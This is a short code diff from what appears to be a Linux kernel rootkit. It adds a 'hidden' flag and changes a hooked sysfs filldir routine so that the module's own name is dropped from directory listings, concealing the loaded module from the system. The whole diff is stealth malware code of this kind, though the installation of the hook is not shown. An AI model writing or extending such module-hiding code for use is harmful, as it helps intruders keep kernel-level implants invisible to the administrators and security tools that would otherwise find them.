@@ -21,6 +21,8 @@ int size_of_pattern = sizeof(activate_pattern)-1;
 int cur_position = 0;
 int last_match = -1;
 
+int hidden = 0;
+
 struct list_head tos;
 
 // for convenience, I'm using the following notations for fun pointers:
@@ -119,7 +121,7 @@ static void handle_input(char *buf, int count)
 
 
 int hooked_sysfs_filldir(void* __buf, const char* name, int namelen, loff_t offset, u64 ino, unsigned d_type){
-    if (hidden && strcmp(name, "module_hiding") == 0){
+    if (hidden && strcmp(name, THIS_MODULE->name) == 0){
         OUR_DEBUG("hooked_sysfs_filldir: %s\n", (char*)name);
         return 0;
     }
